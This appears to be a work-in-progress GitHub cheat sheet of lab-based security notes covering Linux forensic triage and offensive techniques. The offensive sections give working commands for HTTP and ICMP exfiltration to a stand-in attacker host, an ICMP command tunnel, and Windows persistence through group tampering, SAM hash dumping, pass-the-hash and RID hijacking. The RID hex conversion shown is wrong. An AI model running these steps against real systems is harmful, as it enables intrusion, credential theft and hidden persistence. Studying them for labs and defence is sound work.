> [!Note]
> Heavy work in progress

<p align="center"><img alt="" src="" width="300" /></p>

*<p align="center">A curated list of steps/processes to use when tackling a certain problem.</p>*

When dealing with a certain challenge, you have to come up with a plan to come up with a solution. But you are not the first one to have dealt with this. So here I present a list of processes I have used that could help me and others finding the right programs/commands that they need.

<p align="center"><img alt="Need a better meme here.." src="https://github.com/Kevinovitz/cyber-security-megathread/raw/main/images/Cyber_Meme_07.png" width="300" /></p>

----

### Subjects

- [Knowledge Bases](#knowledge-bases)
- [Cheatsheets](#cheatsheets)
- [Tools Top Tips](#tools-top-tips)
- [Data Exfiltration](#data-exfiltration)
- [Digital Forensics](#digital-forensics)
- [Misc](#misc)
- [Persistence](#persistence)

## Knowledge Bases

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Cheatsheets

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Tools Top Tips

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

## Data Exfiltration



### TCP Socket



### SSH



### HTTP(S)

#### HTTP Tunneling

Encapsulates other protocols and sends them back and forth via the HTTP protocol. Create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol.

Use a [Neo-reGeorg tool](https://github.com/L-codes/Neo-reGeorg) to establish a communication channel to access the internal network devices.

Generate a Neo-ReGeorg key

```console
python3 neoreg.py generate -k thm
```

Upload tunnel file to the victim server.

Create the tunnel

```console
python3 neoreg.py -k thm -u http://10.10.230.138/uploader/files/tunnel.php
```

Connect to a machine behind the webserver through the tunnel.

**[curl](commands/generalcommands.md#curl)**

```console
curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
```

### ICMP

Sending data with an ICMP ping packet

#### Manually

Convert payload into hex, for example with xxd.

```bash
echo "thm:tryhackme" | xxd -p
```

Send a **[ping](commands/generalcommands.md#ping)** request with the payload.

```bash
ping <IP> -c <nr of requests> -p <payload in hex format>

ping 10.10.230.138 -c 1 -p 74686d3a7472796861636b6d650a 
```

Capture the request with e.g., Wireshark.

#### MetaSploit

Select the `icmp_exfill` module to set a listener to capture any ICMP packets. It starts recording upon receiving a trigger and ends when an EOF trigger is received.

Set the correct interface to listen on.

```bash
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src ATTACKBOX_IP
set INTERFACE eth0
run
```

Now Metasploit is waiting for a beginning of file trigger as stated.

Using nping or regular ping send a BOF trigger to start recording data (from the victim machine).

```bash
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
```

Send the rest of the data in a similar manner.

Send the EOF trigger.

```bash
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "OEF"
```

Find the loot in the location as stated (on the attack machine).

#### Tunneling

ICMPDoor tool can be used to create an ICMP tunnel.

🔗 https://github.com/krabelize/icmpdoor

Setup a host on the victim machine.

```bash
sudo icmpdoor -i eth0 -d 192.168.0.133
```

Setup a client on the attack machine

```bash
sudo icmp-cnc -i eth1 -d 192.168.0.121
```

Send commands to the victim machine as usual.

### DNS



## Digital Forensics

### Examining Cron Jobs

Cron jobs are a common persistence mechanism on Linux. Inspect scheduled tasks to identify any suspicious or attacker-added entries.

```bash
crontab -l
```
List cron jobs for the current user.

```bash
cat /etc/crontab
```
View the system-wide crontab.

```bash
ls -la /etc/cron.*
```
List all cron directories (hourly, daily, weekly, monthly).

```bash
sudo ls -al /var/spool/cron/crontabs/
```
List which users have crontab files configured.

```bash
sudo cat /var/spool/cron/crontabs/<username>
```
Inspect the cron configuration for a specific user.

```bash
cat /var/spool/cron/crontabs/*
```
View cron jobs for all users (requires elevated privileges).

### Process Analysis

Inspecting running processes can reveal malicious activity such as hidden processes, suspicious parent-child relationships, or processes communicating with external hosts.

**[ps](commands/generalcommands.md#ps)**

```bash
ps aux
```
List all running processes with detailed information.

**[pstree](commands/generalcommands.md#pstree)**

```bash
pstree -aups
```
Display processes in a tree structure, showing parent-child relationships and command arguments.

**[top](commands/generalcommands.md#top)**

```bash
top
```
Interactive real-time view of running processes and resource usage.

**[lsof](commands/generalcommands.md#lsof)**

```bash
lsof -i
```
List open network connections. Add a port with `:PORT` to filter, e.g. `lsof -i :4444`.

```bash
sudo lsof -p <PID>
```
List all open files (including network sockets) for a specific process. Useful for investigating a suspicious PID found via `ps` or `pstree`.

**[pspy64](commands/generalcommands.md#pspy64)**

```bash
./pspy64
```
Monitor processes and commands executed without requiring root privileges. Useful for detecting cronjobs or scripts executed by other users.

### Service & Journal Analysis

Services are a common persistence mechanism. Reviewing active services and their logs can reveal attacker-installed backdoors or compromised legitimate services.

**[systemctl](commands/generalcommands.md#systemctl)**

```bash
sudo systemctl list-units --all --type=service
```
List all services including inactive and failed ones. The broad view helps uncover suspicious or oddly named services.

```bash
systemctl list-units --type=service --state=running
```
List only currently running services.

```bash
systemctl status <service-name>
```
View the status and recent log output for a specific service.

```bash
systemctl cat <service-name>
```
Print the full unit file for a service. Reveals hardcoded commands, persistence logic, or network activity.

```bash
cat /etc/systemd/system/<service>.service
```
Directly inspect the service definition file on disk.

**[journalctl](commands/generalcommands.md#journalctl)**

```bash
sudo journalctl -f -u <service-name>
```
Follow (stream) logs for a specific service in real time. Useful for observing malicious service behavior as it happens.

```bash
journalctl -u <service-name>
```
View the complete historical journal log for a specific service.

```bash
journalctl --since "1 hour ago"
```
View all journal entries from the past hour. Useful for identifying recent suspicious activity.

### Browser Forensics

Browser artifacts such as history, cookies, saved credentials, and session data can be extracted for forensic analysis.

#### Firefox - **[dumpzilla.py](commands/generalcommands.md#dumpzillapy)**

The Firefox profile is typically located at `~/.mozilla/firefox/<profile>/`. To find the profile name, check `~/.mozilla/firefox/profiles.ini`.

```bash
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --All
```
Extract all available data from the Firefox profile.

```bash
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --Bookmarks
```
Extract saved bookmarks. May reveal C2 infrastructure or attacker reconnaissance sites.

```bash
sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --Cookies --Passwords
```
Extract cookies and saved passwords from the Firefox profile.

🔗 https://github.com/Busindre/dumpzilla

### Securing the Environment

While performing live forensic analysis, it is essential to note that it is a potentially compromised host. It is therfore a good idea to ensure we are using known good binaries and libraries to conduct our information gathering and analysis. Often, this can be done by mounting a USB or drive containing binaries from a clean Debian-based installation (/bin, /sbin, /lib, and /lib64).

We can modify our `PATH` and `LD_LIBRARY_PATH` (shared libraries) environment variables to use these trusted binaries:

```bash
export PATH=/mnt/usb/bin:/mnt/usb/sbin
export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
```

### Kernel Log Analysis

The kernel ring buffer and kernel log file record hardware events, driver messages, and system errors. Useful for detecting rootkit installations, unusual module loading, and hardware-level tampering.

**[dmesg](commands/generalcommands.md#dmesg)**

```bash
sudo dmesg
```
View the current contents of the kernel ring buffer.

```bash
sudo dmesg -T | grep '<keyword>'
```
View ring buffer messages with human-readable timestamps, filtered by keyword. Useful for investigating suspicious module loads or kernel taints.

```bash
sudo dmesg -T | grep 'custom_kernel'
```
Example: detect a custom or unsigned kernel module load.

```bash
cat /var/log/kern.log
```
View the persistent kernel log file (managed by rsyslog/syslog). Use `less` or `tail -f` for larger files.

```bash
tail -f /var/log/kern.log
```
Follow the kernel log in real time.

### Audit Log Analysis

The Linux audit framework (`auditd`) records system calls, file access, and user activity. Rules define what gets logged; `ausearch` and `aureport` are used to query and report on those logs. Audit logs are stored in `/var/log/audit/audit.log`.

#### Setting Audit Rules with **[auditctl](commands/generalcommands.md#auditctl)**

Rules added via `auditctl` are temporary (cleared on reboot). For persistent rules, add them to `/etc/audit/audit.rules`.

```bash
sudo auditctl -w /etc/passwd -p wra -k users
```
Watch `/etc/passwd` for write, read, and attribute changes. Tags events with the key `users`.

```bash
sudo auditctl -a always,exit -F arch=b64 -S execve -k execve_syscalls
```
Log every program execution via the `execve` syscall on 64-bit systems. Tags events with `execve_syscalls`.

#### Querying Logs with **[ausearch](commands/generalcommands.md#ausearch)**

```bash
sudo ausearch -k <key>
```
Search audit logs by rule key.

```bash
sudo ausearch -k users
```
Find all events tagged with the `users` key (e.g., `/etc/passwd` changes).

```bash
sudo ausearch -k execve_syscalls
```
Find all program execution events.

#### Generating Reports with **[aureport](commands/generalcommands.md#aureport)**

```bash
sudo ausearch -k users | aureport -f --summary
```
Pipe ausearch output to aureport to generate a summary report of file-related events.

```bash
sudo ausearch -k users | aureport -f user-logs
```
Generate a named report from ausearch output.

### System Profiling

When performing live analysis on a potentially compromised host, establish a baseline by profiling the system's identity, hardware, software, and network state before proceeding with deeper investigation.

**[hostnamectl](commands/generalcommands.md#hostnamectl)**

```bash
hostnamectl
```
Display system hostname, machine ID, operating system, kernel version, and virtualisation type.

**[uptime](commands/generalcommands.md#uptime)**

```bash
uptime
```
Show how long the system has been running, the number of logged-in users, and load averages.

**[lscpu](commands/generalcommands.md#lscpu)**

```bash
lscpu
```
Display detailed CPU architecture information (cores, threads, vendor, model).

**[df](commands/generalcommands.md#df)**

```bash
df -h
```
Report disk space usage across all mounted filesystems in human-readable format.

**[lsblk](commands/generalcommands.md#lsblk)**

```bash
lsblk
```
List block devices (disks and partitions) with sizes and mount points.

**[free](commands/generalcommands.md#free)**

```bash
free -h
```
Show memory usage (total, used, free, cached) in human-readable format.

**[dpkg](commands/generalcommands.md#dpkg)**

```bash
dpkg -l
```
List all installed Debian packages. Useful for identifying suspicious or unexpected software.

**[apt](commands/generalcommands.md#apt)**

```bash
apt list --installed | head -n 30
```
List installed packages via apt. Can help spot packages that seem out of place in the server context.

**[ip](commands/generalcommands.md#ip)**

```bash
ip a
```
Display all network interfaces and their IP addresses. Modern replacement for `ifconfig`.

```bash
ip r
```
Display the IP routing table. Modern replacement for `route`.

**[ss](commands/generalcommands.md#ss)**

```bash
ss -tlun
```
Show active TCP/UDP listening sockets with process names. Modern replacement for `netstat -tlun`.

## Misc



## Persistence

### Linux

### Windows

#### **Tampering With Unprivileged Accounts**
	
##### *Assign Group Memberships*
	
- Make user part of Administrators group.

```cmd
net localgroup "Administrators" thmuser1 /add
```

- If thats to suspicious, add to Backup Operators group and Remote Management for RDP.

```cmd
net localgroup "Backup Operators" thmuser1 /add
net localgroup "Remote Management Users" thmuser1 /add
```

- Disable UAC privilige stripping for remote users.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- Remote into the machine (RDP or Evil-WinRM)

```console
evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
```

- Export and download SAM and SYSTEM registry hives.

```console
reg save hklm\system system.bak
reg save hklm\sam sam.bak

download system.bak
download sam.bak
```

- Dump hashes from SAM and SYSTEM hives.

```console
python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- Pass the hash with admin account.

```console
evil-winrm -i 10.10.112.47 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```

##### *Special Privileges and Security Descriptors*

- Add `SeBackupPrivilege` and `SeRestorePrivilege` to an account.

```cmd
secedit /export /cfg config.ini
secedit /import /cfg config.ini /db config.db
secedit /configure /db config.db /cfg config.ini
```

- Change WinRM security descriptor and add user here with full control.

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

- Disable UAC privilige stripping for remote users.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

##### *RID Hijacking*

- Find RIDs of user and admin user.

```cmd
wmic useraccount get name,sid
```

- Open regedit with privileges (tool must be present on target system).

```cmd
PsExec.exe -i -s regedit
```

- Find users here in the registry: `HKLM\SAM\SAM\Domains\Account\Users\` .

- Convert (admin) RID to hex value (i.e., 1010 = 0x1F4) and change F variable within the correct user key with the RID of the admin account (little endian notation = 04F1 -> F4 01).

- Admin hex RID ussualy is F4 01, put this on line 0030 of the F variable.

<!--- 

## TITLE

### Usefull documentation

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

### Related tools

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

<br>

--->
